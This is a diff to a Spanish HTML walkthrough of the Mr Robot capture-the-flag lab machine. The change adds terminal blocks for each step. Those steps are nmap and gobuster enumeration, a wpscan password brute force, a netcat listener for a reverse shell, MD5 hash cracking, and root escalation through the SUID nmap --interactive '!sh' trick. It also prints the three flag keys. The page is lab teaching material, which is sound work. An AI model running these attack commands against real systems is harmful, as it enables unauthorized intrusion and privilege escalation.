@@ -233,6 +233,11 @@
     tr:last-child td {
       border-bottom: none;
     }
+    /* Para tablas sin cabecera, usamos solo td en negrita si queremos */
+    .table-plain td:first-child {
+      font-weight: 600;
+      color: #e3edf7;
+    }
 
     /* --- LISTAS --- */
     ul, ol {
@@ -338,8 +343,6 @@
       </div>
     </div>
 
-    <!-- CONTENIDO (índice)  -->
-
     <!-- DECLARACIÓN DE USO ÉTICO -->
     <section style="margin-bottom:24px;">
       <h2>Declaración de uso ético</h2>
@@ -363,22 +366,31 @@
       <h3>1.- Reconocimiento de máquinas</h3>
       <p>Ambas máquinas se encuentran dentro de una misma interfaz de red.</p>
       <p>Con el comando ip a comprobamos la IP que ha sido asignada a nuestra máquina Kali Linux. ( IP Kali Linux -&gt; 192.168.56.101)</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> ip a
+      </div>
       <p>Con el comando <strong>sudo nmap -sn 192.168.56.0/24</strong> buscamos la IP de nuestra máquina MR Robot.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> sudo nmap -sn 192.168.56.0/24
+      </div>
       <figure>
         <img src="imagenes/mr-robot1.png" alt="Resultado del escaneo de red con nmap" />
         <figcaption>Escaneo de red: IP de MR Robot = 192.168.56.102</figcaption>
       </figure>
       <p>Ahora procederemos a escanear la máquina Mr Robot más a fondo para saber los servicios que está prestando y en que puertos.</p>
       <p>Para ello utilizaremos el comando <strong>nmap -sV 192.168.56.102</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nmap -sV 192.168.56.102
+      </div>
       <figure>
         <img src="imagenes/mr-robot2.png" alt="Escaneo de puertos con nmap -sV" />
         <figcaption>Puertos abiertos: 22 (ssh), 80 (http), 443 (https)</figcaption>
       </figure>
       <p>Como podemos ver obtenemos que la máquina tiene abiertos los siguientes puertos y está ofreciendo los siguientes servicios:</p>
       <div class="table-wrap">
-        <table>
-          <thead><tr><th>Puerto 22</th><th>ssh</th></tr></thead>
+        <table class="table-plain">
           <tbody>
+            <tr><td>Puerto 22</td><td>ssh</td></tr>
             <tr><td>Puerto 80</td><td>Apache / http</td></tr>
             <tr><td>Puerto 443</td><td>Apache / Ssl/http</td></tr>
           </tbody>
@@ -394,6 +406,9 @@
       <h3>2.-Enumeración Web</h3>
       <p>Ahora que ya sabemos que hay un servidor web , vamos a realizar un escaneo de enumeración web que usa Nmap para descubrir directorios y archivos ocultos en servidores web.</p>
       <p>Utilizaremos el comando <strong>nmap --script=http-enum.nse -p 80 192.168.56.102</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nmap --script=http-enum.nse -p 80 192.168.56.102
+      </div>
       <figure>
         <img src="imagenes/mr-robot4.png" alt="Resultado del script http-enum de Nmap" />
         <figcaption>Enumeración con Nmap: se detecta WordPress y archivos como robots.txt</figcaption>
@@ -401,6 +416,9 @@
       <p>Este comando nos da muchísima información que podemos utilizar para nuestra investigación. Por ejemplo, ya sabemos que nos encontramos ante una página con <strong>wordpress</strong> y podemos ver que el servidor tiene algunos archivos interesantes como es <strong>'robots.txt'</strong>.</p>
       <p>Los comandos que muestran los archivos de una web no siempre muestran todas las rutas en su totalidad, por eso es interesante utilizar alguna herramienta más para ver si hemos detectado todos los directorios de la página.</p>
       <p>Para ello hemos utilizado la herramienta gobuster y el siguiente comando <strong>gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
+      </div>
       <figure>
         <img src="imagenes/mr-robot4_1.png" alt="Resultado de gobuster" />
         <figcaption>Directorio descubiertos con gobuster</figcaption>
@@ -418,6 +436,9 @@
       </figure>
       <p>Vamos a descargar los archivos y ver que es lo que contienen:</p>
       <p>Con el comando <strong>wget http://192.168.56.102/key-1-of-3.txt</strong> descargamos el archivo key-1-of-3.txt y al abrirlo vemos que contiene la primera key que estábamos buscando.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> wget http://192.168.56.102/key-1-of-3.txt
+      </div>
       <div class="term-block" style="border-color:#00a8ff;">
         <span class="highlight">Key 1: 073403c8a58a1f80d943455fb30724b9</span>
       </div>
@@ -426,6 +447,9 @@
         <figcaption>Primera key encontrada</figcaption>
       </figure>
       <p>Con el comando <strong>wget http://192.168.56.102/fsocity.dic</strong> descargamos el archivo fsocity.dic y comprobamos que es un diccionario con posibles nombres o contraseñas para acceder a wordpress.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> wget http://192.168.56.102/fsocity.dic
+      </div>
       <figure>
         <img src="imagenes/mr-robot7.png" alt="Vista del diccionario fsocity.dic" />
         <figcaption>fsocity.dic: 858.160 líneas</figcaption>
@@ -437,6 +461,12 @@
 
       <h4>Primera opción:</h4>
       <p>Con el objetivo de reducir el tiempo de ejecución a la hora de intentar hacer el ataque de fuerza bruta , utilizamos el comando <strong>wc -l fsocity.dic</strong> para saber el numero de palabras que contiene el fichero y el comando <strong>sort fsocity.dic | uniq | wc -l</strong> para quedarnos solo una vez con cada palabra, quitando así las repetidas y reduciendo el tiempo del ataque considerablemente. (Hemos pasado de tener 858160 palabras a 11451).</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> wc -l fsocity.dic
+      </div>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> sort fsocity.dic | uniq | wc -l
+      </div>
       <figure>
         <img src="imagenes/mr-robot8.png" alt="Resultado de wc y sort uniq" />
         <figcaption>Reducción del diccionario</figcaption>
@@ -447,15 +477,18 @@
         <figcaption>users.txt con nombres de la serie</figcaption>
       </figure>
       <p>Ahora ya podemos realizar el ataque de fuerza bruta para intentar obtener acceso a wordpress.Para ello utilizaremos el comando <strong>wpscan --url http://192.168.56.102 -U users.txt -P words.dic --password-attack wp-login</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> wpscan --url http://192.168.56.102 -U users.txt -P words.dic --password-attack wp-login
+      </div>
       <figure>
         <img src="imagenes/mr-robot11.png" alt="Resultado de WPScan" />
         <figcaption>WPScan encuentra dos usuarios: Elliot y elliot, con la misma contraseña: ER28-0652</figcaption>
       </figure>
       <p>Como podemos ver hemos obtenido dos posibles usuarios:</p>
       <div class="table-wrap">
-        <table>
-          <thead><tr><th>Elliot</th><th>ER28-0652</th></tr></thead>
+        <table class="table-plain">
           <tbody>
+            <tr><td>Elliot</td><td>ER28-0652</td></tr>
             <tr><td>elliot</td><td>ER28-0652</td></tr>
           </tbody>
         </table>
@@ -471,17 +504,13 @@
       <figure>
         <img src="imagenes/mr-robot4_2.png" alt="Página de licencia" />
         <figcaption>Página de licencia</figcaption>
-		<img src="imagenes/mr-robot4_3.png" alt="CódigoB64" />
+        <img src="imagenes/mr-robot4_3.png" alt="CódigoB64" />
         <figcaption>Código en base64 al final de la página</figcaption>
-      </figure>
-      <figure>
-        <img src="imagenes/mr-robot11.png" alt="Código en base64" />
-        <figcaption>Fragmento codificado en base64</figcaption>
       </figure>
       <p>Investigando un poco, podemos ver que ese código está códificado en base 64.</p>
       <p>Para descifrarlo vamos a utilizar el comando</p>
       <div class="term-block">
-        <span class="prompt">root@kali:~$</span> echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+        <span class="prompt">Joseltc@kali:~$</span> echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
       </div>
       <figure>
         <img src="imagenes/mr-robot4_4.png" alt="Resultado del descifrado" />
@@ -500,7 +529,7 @@
       <p><strong>*Importante : La dirección ip que se introduce en este código es la de la máquina atacante, no la de la máquina atacada.</strong></p>
       <p>Una vez introducido el código debemos abrir una terminal con el comando <strong>nc</strong></p>
       <div class="term-block">
-        <span class="prompt">root@kali:~$</span> nc -lnvp 5555
+        <span class="prompt">Joseltc@kali:~$</span> nc -lnvp 5555
       </div>
       <figure>
         <img src="imagenes/mr-robot13_1.png" alt="Listener netcat" />
@@ -517,14 +546,26 @@
         <figcaption>Shell conectada</figcaption>
       </figure>
       <p>Ahora ya que estamos dentro de la máquina podemos ejecutar una serie de comandos como:</p>
+      <div class="term-block">
+        <span class="prompt">$</span> pwd
+      </div>
+      <div class="term-block">
+        <span class="prompt">$</span> id
+      </div>
+      <div class="term-block">
+        <span class="prompt">$</span> whoami
+      </div>
+      <div class="term-block">
+        <span class="prompt">$</span> ls -la /home
+      </div>
       <figure>
         <img src="imagenes/mr-robot16.png" alt="Comandos básicos en la shell" />
         <figcaption>Exploración inicial</figcaption>
       </figure>
       <div class="table-wrap">
-        <table>
-          <thead><tr><th>PWD</th><th>Directorio actual</th></tr></thead>
+        <table class="table-plain">
           <tbody>
+            <tr><td>PWD</td><td>Directorio actual</td></tr>
             <tr><td>ID</td><td>Datos sobre el usuario actual</td></tr>
             <tr><td>WHOAMI</td><td>Usuario actual</td></tr>
             <tr><td>LS -LA /HOME</td><td>Directorios home que contiene la máquina</td></tr>
@@ -533,20 +574,29 @@
       </div>
       <p>Podemos ver que la máquina contiene un directorio <strong>home</strong> con nombre <strong>robot.</strong></p>
       <p>Haremos un cd para entrar en ese directorio y ver lo que contiene.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> cd /home/robot
+      </div>
+      <div class="term-block">
+        <span class="prompt">$</span> ls -la
+      </div>
       <figure>
-        <img src="imagenes/mr-robot17.png" alt="Contenido de /home/robot" />
+        <img src="imagenes/mr-robot16_1.png" alt="Contenido de /home/robot" />
         <figcaption>Archivos del usuario robot</figcaption>
       </figure>
       <p>Como se puede ver en la imagen tenemos un archivo llamado <strong>key-2-of-3.txt</strong> que contiene la segunda key de las 3 que vamos buscando y un archivo password.raw-md5 que suponemos que contendrá la contraseña del usuario robot ,que se encuentra hasheada en md5.</p>
       <p>Si intentamos ver el contenido del fichero key-2-of-3.txt, podemos comprobar que no tenemos permisos, por lo tanto ,vamos a ver el contenido del archivo password.raw-md5 con el fin de entrar con el usuario robot en el sistema.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> cat password.raw-md5
+      </div>
       <figure>
-        <img src="imagenes/mr-robot18.png" alt="Contenido de password.raw-md5" />
+        <img src="imagenes/mr-robot17.png" alt="Contenido de password.raw-md5" />
         <figcaption>password.raw-md5 muestra el hash</figcaption>
       </figure>
       <p>Como en el nombre del fichero indica MD5 vamos a intentar desencriptar el código para encontrar la contraseña. Para ello, utilizaremos la página: <a href="https://www.dcode.fr/funcion-hash-md5" target="_blank">https://www.dcode.fr/funcion-hash-md5</a></p>
       <p>Y podemos ver que la contraseña es : <strong>abcdefghijklmnopqrstuvwxyz</strong></p>
       <figure>
-        <img src="imagenes/mr-robot19.png" alt="Descifrado MD5" />
+        <img src="imagenes/mr-robot18.png" alt="Descifrado MD5" />
         <figcaption>Contraseña desencriptada</figcaption>
       </figure>
 
@@ -554,35 +604,56 @@
       <h3>4.- Escalada de privilegios</h3>
       <p>Al intentar acceder con el usuario robot , vemos que la terminal no está preparada para ejecutar comandos root.</p>
       <figure>
-        <img src="imagenes/mr-robot20.png" alt="Intento de su robot" />
+        <img src="imagenes/mr-robot19.png" alt="Intento de su robot" />
         <figcaption>No se puede ejecutar comandos root</figcaption>
       </figure>
       <p>Ahora lo que podemos hacer es buscar los binarios SUID, que son archivos ejecutables en sistemas tipo Unix/Linux que tienen un permiso especial que permite al usuario que los ejecuta obtener temporalmente los privilegios del propietario del archivo. Por lo tanto, lo que haremos es ejecutar comandos dentro de estos archivos ejecutables que nos permitirán escalar a root.</p>
       <p>Utilizaremos el comando <strong>find / -user root -perm -4000 -type f 2&gt;/dev/null</strong></p>
+      <div class="term-block">
+        <span class="prompt">$</span> find / -user root -perm -4000 -type f 2>/dev/null
+      </div>
       <figure>
-        <img src="imagenes/mr-robot21.png" alt="Búsqueda de binarios SUID" />
+        <img src="imagenes/mr-robot20.png" alt="Búsqueda de binarios SUID" />
         <figcaption>Lista de binarios SUID</figcaption>
       </figure>
       <p>Usaremos nmap y para ello debemos investigar nmap. Haremos cd /usr/local/bin.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> cd /usr/local/bin
+      </div>
       <p>Luego comprobaremos que versión de nmap tiene la máquina con nmap --version para ver si es vulnerable.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> nmap --version
+      </div>
       <p>La versión es 3.81 y tras una breve búsqueda en la red podemos encontrar una vulnerabilidad que nos permite escalar privilegios en la shell con el comando ¡sh</p>
       <p><a href="https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a" target="_blank">https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a</a>.</p>
       <p>Para introducir el comando ¡sh debemos abrir una shell interactiva con el comando nmap --interactive. Una vez ejecutado, con whoami ya podemos ver que somos root. Y además podemos navegar hacia la ruta /home/root donde ya podemos consultar la key 2 con el comando cat.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> nmap --interactive
+      </div>
+      <div class="term-block">
+        <span class="prompt">nmap></span> !sh
+      </div>
       <div class="term-block" style="border-color:#00a8ff;">
         <span class="highlight">Key 2: 822c73956184f694993bede3eb39f959</span>
       </div>
       <figure>
-        <img src="imagenes/mr-robot22.png" alt="Escalada a root y obtención de key 2" />
+        <img src="imagenes/mr-robot21.png" alt="Escalada a root y obtención de key 2" />
         <figcaption>Key 2 obtenida</figcaption>
       </figure>
       <p>Ahora que ya tenemos privilegios de root , vamos a navegar por las distintas carpetas del sistema . Con ls -la podemos ver toda la estructura de carpetas en / .</p>
+      <div class="term-block">
+        <span class="prompt">#</span> ls -la /
+      </div>
       <p>Investigaremos las marcadas abajo.</p>
       <figure>
-        <img src="imagenes/mr-robot23.png" alt="Estructura de carpetas en /" />
+        <img src="imagenes/mr-robot22.png" alt="Estructura de carpetas en /" />
         <figcaption>Listado de directorios raíz</figcaption>
       </figure>
       <p>Como únicamente nos falta una key y los nombres de las anteriores keys seguían la siguiente estructura 'key-1-of-3.txt' o 'key-2-of-3.txt' vamos a utilizar find sobre las principales carpetas del sistema para ver si damos con 'key-3-of-3.txt' de manera rápida.</p>
       <p>Para ello utilizaremos el comando <strong>find /home /var /etc /root -name "key-3-of-3.txt" 2&gt;/dev/null .</strong> Y como podemos ver nos devuelve que el archivo 'key-3-of-3.txt' se encuentra en el directorio root y la key es :</p>
+      <div class="term-block">
+        <span class="prompt">#</span> find /home /var /etc /root -name "key-3-of-3.txt" 2>/dev/null
+      </div>
       <div class="term-block" style="border-color:#00a8ff;">
         <span class="highlight">Key 3: 04787ddef27c3dee1ee161b21670b4e4</span>
       </div>
